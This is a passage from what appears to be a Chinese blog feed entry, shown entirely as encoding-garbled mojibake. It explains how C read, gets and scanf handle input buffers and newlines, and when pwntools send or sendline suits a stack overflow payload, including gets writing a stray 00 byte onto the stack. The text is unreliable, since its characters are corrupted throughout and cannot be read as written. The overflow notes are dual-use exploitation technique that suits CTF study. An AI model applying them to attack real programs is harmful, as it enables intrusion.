ä¸ºè¿™ä¸ªç¼“å†²åŒºé‡Œçš„å›è½¦ç›´æ¥ç»“æŸï¼Œä¸ä¼šä»ç”¨æˆ·è¿™é‡Œè·å–è¾“å…¥ã€‚</strong></em></font></p><p>ç¬¬ä¸‰æ˜¯ï¼Œæˆ‘ä»¬è¾“å…¥çš„å­—èŠ‚æ•°ï¼Œè¶…è¿‡äº†countçš„å­—èŠ‚ï¼Œæ­¤æ—¶ç”¨è¿™ä¸ªå®éªŒæ¥è§£é‡Šï¼Œå†å¥½ä¸è¿‡äº†</p><p><img src="/../img/2706180-20220129192252767-1481032805.png"></p><p><em>å¯ä»¥å‘ç°è¾“å…¥äº†20ä¸ª1ï¼Œä½†ç”±äºreadåªèƒ½ä»ç¼“å†²åŒºé‡Œé¢æ¥æ”¶16ä¸ªå­—èŠ‚ï¼Œå› æ­¤æ‰§è¡Œå®Œreadå‡½æ•°ä¹‹åï¼Œå®ƒçš„ç¼“å†²åŒºé‡Œé¢è¿˜å‰©4ä¸ª1å’Œä¸€ä¸ªå›è½¦ã€‚ä½†ç”±äºscanfçš„æ€§è´¨æ˜¯ï¼Œä»ç¼“å†²åŒºé‡Œé¢è¯»å…¥å†…å®¹ï¼Œé‡è§ç©ºç™½ç¬¦åœæ­¢ï¼Œå¹¶ä¸”ä¸è¯»å…¥ç©ºç™½ç¬¦ï¼Œå› æ­¤açš„å†…å®¹æ˜¯4ä¸ª1ã€‚æœ€åç”±äºç¼“å†²åŒºåªå‰©äº†ä¸€ä¸ªå›è½¦ï¼Œè¢«getsè¯»åˆ°ä¹‹åï¼ŒæŠŠå›è½¦ä¸¢å¼ƒäº†ï¼Œå› æ­¤ç›´æ¥å£°æ˜äº†getsçš„ç»“æŸï¼Œå¹¶ä¸”getsä»€ä¹ˆéƒ½æ²¡æœ‰è¯»åˆ°</em>ã€‚<strong>å› æ­¤å½“è¾“å…¥çš„å­—èŠ‚æ•°ï¼Œè¶…è¿‡äº†ç¬¬ä¸‰ä¸ªå­—èŠ‚çš„å‚æ•°ï¼Œå°±å¦‚åŒç¬¬äºŒç§æƒ…å†µä¸€æ ·ï¼Œå¤šå‡ºæ¥çš„å†…å®¹éƒ½ä¼šåœç•™åœ¨ç¼“å†²åŒºä¸­ï¼ˆåŒ…æ‹¬å›è½¦ï¼Œè¿™ä¸ªå›è½¦ç”¨sendlineå‘é€payloadï¼Œæ‰ä¼šæœ‰å›è½¦ï¼‰</strong></p><h1 id="getså‡½æ•°"><a href="#getså‡½æ•°" class="headerlink" title="getså‡½æ•°"></a>getså‡½æ•°</h1><p><em>ä½¿ç”¨ gets() æ—¶ï¼Œç³»ç»Ÿä¼šå°†æœ€åè¾“å…¥çš„æ¢è¡Œç¬¦ï¼ˆä¹Ÿå°±æ˜¯å›è½¦ï¼‰ä»ç¼“å†²åŒºä¸­å–å‡ºæ¥ï¼Œç„¶åç»™èˆå¼ƒï¼Œå› æ­¤ç¼“å†²åŒºä¸­ä¸ä¼šé—ç•™æ¢è¡Œç¬¦</em>ã€‚getså‡½æ•°å°½ç®¡ä¼šæº¢å‡ºï¼Œä½†æ˜¯ç”±äºå®ƒä¼šæŠŠè‡ªèº«å‘é€çš„å›è½¦ç»™ä»ç¼“å†²åŒºä¸­ä¸¢å¼ƒï¼Œ<strong>å› æ­¤é‡è§getså‡½æ•°ï¼Œå°±ä¸ç”¨è€ƒè™‘sendlineå’Œsendçš„åŒºåˆ«ã€‚ä½†æ˜¯å§ï¼Œé¢å¯¹è¿™ä¸ªå‡½æ•°ï¼Œä½ ä¸ç”¨sendlineè¿˜ä¸è¡Œï¼Œå› ä¸ºå®ƒéœ€è¦å›è½¦æ¥å£°æ˜ä½ è¾“å…¥çš„ç»“æŸï¼Œå°½ç®¡å®ƒä¼šæŠŠ\nä¸¢å¼ƒ</strong>ã€‚å¹¶ä¸”å€¼å¾—æ³¨æ„çš„å°±æ˜¯ï¼Œå¦‚æœå½“getsæº¢å‡ºçš„è¯ï¼ˆæˆ‘æŒ‡çš„æ˜¯æ•°ç»„æº¢å‡ºï¼‰ï¼Œé‚£ä¹ˆå®ƒä¼šåœ¨ä½ å‘é€æ‰€æœ‰æ•°æ®ä¹‹åä¼šåœ¨æœ€åå¡«ä¸Šä¸€ä¸ª00ï¼Œå¦‚æœä¸æº¢å‡ºçš„è¯ï¼Œå°±ä¸ä¼šå‡ºç°è¿™ä¸ª00ã€‚ä½¿ç”¨getsè¾“å…¥çš„å­—èŠ‚ï¼Œæ­£å¥½å’Œåˆ›å»ºæ•°ç»„çš„å¤§å°ä¸€æ ·çš„è¯ï¼Œä¹Ÿä¼šæº¢å‡ºï¼ˆå¯èƒ½æ˜¯å› ä¸ºå›è½¦çš„åŸå› ï¼Œå°½ç®¡ä¸¢å¼ƒäº†ï¼Œä½†è¿˜æ˜¯ä¼šåœ¨è¾“å…¥çš„å­—ç¬¦ä¸²ç»“å°¾å¡«ä¸Šä¸€ä¸ª00ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœç”¨getsè¾“å…¥æº¢å‡ºæ•°ç»„çš„è¯ï¼Œå®ƒä¼šå’Œreadçš„ç¬¬ä¸€ç§æƒ…å†µä¸€æ ·ï¼ŒæŠŠ00å†™å…¥æ ˆä¸­ï¼Œä¹Ÿä¼šå¹²æ‰°æ ˆä¸­æ•°æ®ã€‚</p><h1 id="scanfå‡½æ•°"><a href="#scanfå‡½æ•°" class="headerlink" title="scanfå‡½æ•°"></a>scanfå‡½æ•°</h1><p>è€Œscanf(â€˜%sâ€™,c)çš„æ—¶å€™ï¼Œ**scanfæ˜¯ä»ç¬¬ä¸€ä¸ªéç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ æ¢è¡Œ åˆ¶è¡¨ç¬¦ï¼‰å¼€å§‹è¯»å…¥çš„ï¼Œå°±æ˜¯ä½ è¾“å…¥çš„æ•°æ®ï¼Œåœ¨æŒ‰ä¸‹å›è½¦çš„ä¹‹å‰ï¼Œ<font color=red><em>è¾“å…¥çš„æ•°æ®éƒ½ä¼šè¢«å­˜å‚¨åœ¨è¾“å…¥ç¼“å†²åŒºï¼ˆåŒ…æ‹¬å›è½¦ï¼‰</em></font>**ï¼Œå½“æŒ‰ä¸‹å›è½¦é”®ä¹‹åï¼Œscanfå°±ä¼šå¼€å§‹<u>ä»è¾“å…¥ç¼“å†²åŒºé‡Œé¢è¯»å–æ•°æ®</u>ï¼ŒæŠŠè¯»å–çš„æ•°æ®éƒ½ä¼ é€åˆ°ä½ æŒ‡å®šçš„åœ°å€ï¼Œç›´åˆ°é‡è§äº†ç©ºç™½ç¬¦<br>ç„¶ååœæ­¢ã€‚<font color=red><em><strong>å®ƒä»…ä»…æ˜¯é‡è§ç©ºç™½ç¬¦åœæ­¢äº†ï¼Œä½†æ˜¯ç©ºç™½ç¬¦ä»¥åŠç©ºç™½ç¬¦åé¢çš„å†…å®¹ä¾ç„¶åœ¨è¾“å…¥ç¼“å†²åŒºé‡Œé¢ã€‚</strong></em></font></p><p>å¦‚æœå†é‡è§getså‡½æ•°çš„è¯ï¼Œgetså‡½æ•°ä¼šä»ç¼“å†²åŒºé‡Œé¢ç»§ç»­ä»ç©ºç™½ç¬¦å¼€å§‹è¯»ï¼ˆç©ºæ ¼ï¼‰ï¼Œç„¶åé‡è§äº†å›è½¦åœæ­¢ï¼Œå¹¶æŠŠå›è½¦ä¸¢å¼ƒï¼Œæ­¤æ—¶æˆ‘ä»¬æ ¹æœ¬æ— æ³•ç”¨getså‡½æ•°è¾“å…¥ï¼Œå› ä¸ºå®ƒåœ¨ç¼“å†²åŒºé‡Œé¢å°±é‡åˆ°äº†æ¢è¡Œç¬¦ã€‚ç”¨ä¸‹é¢çš„å›¾ç‰‡ä¸¾ä¾‹</p><p><img src="/../img/2706180-20220129192309307-314700424.png"></p><p><img src="/../img/2706180-20220129192327106-1249123632.png"><br>scanfå‡½æ•°ä¹Ÿå­˜åœ¨æº¢å‡ºï¼Œå¦‚æœå¯¹å®ƒç”¨sendlineå‘é€æ•°æ®çš„è¯ï¼Œæ˜¯ä¸å¯èƒ½è¢«å›è½¦ï¼ˆ0aï¼‰æ‰€å½±å“æ ˆä¸­æ•°æ®çš„ã€‚ä½†æ˜¯å§ï¼Œé€šè¿‡å®éªŒå‘ç°ï¼Œé¢å¯¹scanfçš„æ—¶å€™ï¼Œä¸ç”¨sendlineè¿˜ä¸è¡Œï¼Œå¿…é¡»è¦ç”¨sendlineï¼Œsendå‘é€çš„è¯ï¼Œä¼šåœ¨æ‰§è¡Œscanfçš„æ—¶å€™å¡ä½ã€‚å› æ­¤é¢å¯¹scanf(â€œ%sâ€)çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç”¨sendlineå‘é€ï¼Œæ—¶åˆ»è¦æ³¨æ„å®ƒçš„å›è½¦ä¼šç•™ç€ç¼“å†²åŒºé‡Œé¢ï¼Œå¯èƒ½å½±å“æ¥ä¸‹æ¥ç¨‹åºçš„æ‰§è¡Œæƒ…å†µã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p><strong><u><em>ä½¿ç”¨sendlineçš„ç»“æœå–å†³äºè¾“å…¥çš„å‡½æ•°</em></u></strong></p><p>å¦‚æœæ˜¯readå‡½æ•°çš„è¯ï¼Œ<font color=red>â‘ åªæœ‰å½“countçš„å­—èŠ‚æ•°å¤§äºä½ æ‰€è¾“å…¥çš„å­—èŠ‚æ•°ï¼Œè¿™ä¸ªå›è½¦æ‰ä¸ä¼šäº§ç”Ÿä»»ä½•çš„å½±å“ï¼Œè€Œå¤šå‡ºæ¥çš„å›è½¦ä¹Ÿä¼šè¢«å½“æˆè¾“å…¥æ•°æ®æ­£å¸¸å­˜å…¥æ ˆä¸­ï¼ˆå¦‚æœè¾“å…¥çš„åœ°å€æ˜¯æ ˆçš„è¯ï¼‰ï¼›â‘¡å½“countå­—èŠ‚æ•°ç­‰äºä½ æ‰€è¾“å…¥çš„å­—èŠ‚æ•°ï¼Œé‚£ä¹ˆæœ€åçš„sendlineçš„å›è½¦ä¼šåœç•™åœ¨æ ˆä¸­ï¼ˆæ²¡æœ‰åœ¨ç¼“å†²åŒºä¸­ï¼‰ï¼Œæ­¤æ—¶å®ƒæ˜¯ä¸æ­£å¸¸å­˜å…¥ï¼Œå› ä¸ºè¿™ä¸ªå›è½¦çš„ç¼˜æ•…ï¼Œå·²ç»é€ æˆäº†æº¢å‡ºï¼›â‘¢å½“countå­—èŠ‚æ•°å°äºä½ æ‰€è¾“å…¥çš„å­—èŠ‚æ•°ï¼Œé‚£ä¹ˆæ²¡æœ‰è¾“å…¥è¿›æŒ‡å®šåœ°å€çš„å†…å®¹ï¼Œéƒ½ä¼šåœç•™åœ¨è¾“å…¥ç¼“å†²åŒºï¼Œæœ‰å¯èƒ½ä¼šå½±å“ä¹‹çš„è¾“å…¥ã€‚<strong>ä½†å€¼å¾—ä¸€æçš„æ˜¯ä½¿ç”¨readå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨sendæ¥å‘é€æ•°æ®ï¼Œè¿™æ ·å°±å¯ä»¥ç¡®ä¿ä¸‡æ— ä¸€å¤±</strong>ã€‚ï¼ˆ</font><strong>å¦‚æœæ˜¯getså‡½æ•°æˆ–è€…scanfå‡½æ•°</strong>ï¼Œæˆ‘ä»¬æ²¡æœ‰åŠæ³•é€‰æ‹©ï¼Œ<strong>åªèƒ½ä½¿ç”¨sendline</strong>ï¼Œè¿™ä¸¤ç§å‡½æ•°åªæœ‰é‡è§sendlineå‘é€çš„å›è½¦ï¼Œæ‰ä¼šåœæ­¢è¯»å…¥ã€‚<strong>getså‡½æ•°ä¼šæ¸…ç©ºç¼“å†²åŒºé‡Œçš„å›è½¦ï¼Œè€Œscanfåˆ™ä¸ä¼šæ¸…ç©ºå›è½¦ã€‚å› æ­¤scanfå¯èƒ½ä¼šå› ä¸ºæ²¡æœ‰æ¸…ç©ºå›è½¦çš„ç¼˜æ•…ï¼Œå¯¹ä¹‹åçš„ç¨‹åºè¾“å…¥å¯èƒ½é€ æˆå½±å“ï¼Œä½†æ˜¯å¦‚æœgetså‡½æ•°æº¢å‡ºäº†æ•°ç»„é™åˆ¶çš„è¯ï¼Œä¼šå¼‚å¸¸çš„åœ¨è¾“å…¥çš„å­—ç¬¦ä¸²ç»“å°¾å¡«ä¸Šä¸€ä¸ª00å­˜å…¥æ ˆä¸­ã€‚æ­¤æ—¶çš„00ä¹Ÿæœ‰å¯èƒ½ä¼šè¦†ç›–åŸæœ¬æ ˆä¸­çš„æ•°æ®</strong>ï¼Œå¦å¤–å°±æ˜¯é‡è§fgetsçš„è¯ï¼Œä¹Ÿæ˜¯æ²¡çš„é€‰ï¼Œåªèƒ½ç”¨sendline</p>]]></content>
      
      
      <categories>
          
          <category> æ¢ç©¶ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¢ç©¶ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
